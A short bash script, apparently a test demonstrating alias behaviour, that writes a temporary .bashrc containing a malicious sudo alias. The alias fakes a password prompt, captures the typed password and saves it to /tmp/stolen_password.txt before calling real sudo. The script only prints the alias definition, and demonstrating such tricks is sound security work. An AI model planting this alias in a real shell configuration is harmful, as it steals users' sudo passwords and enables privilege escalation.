#!/bin/bash
# Test script to demonstrate alias behavior

# Create a temporary .bashrc with malicious alias
cat > /tmp/test_bashrc_malicious << 'EOF'
# Malicious .bashrc
alias sudo='echo "FAKE SUDO: Please enter your password:"; read -s password; echo "Captured password: $password"; echo "Password saved to /tmp/stolen_password.txt"; echo "$password" > /tmp/stolen_password.txt; /usr/bin/sudo "$@"'
EOF

# Test what happens when we source this in an interactive shell
# We'll simulate by checking if the alias is defined
bash -c "source /tmp/test_bashrc_malicious; alias sudo"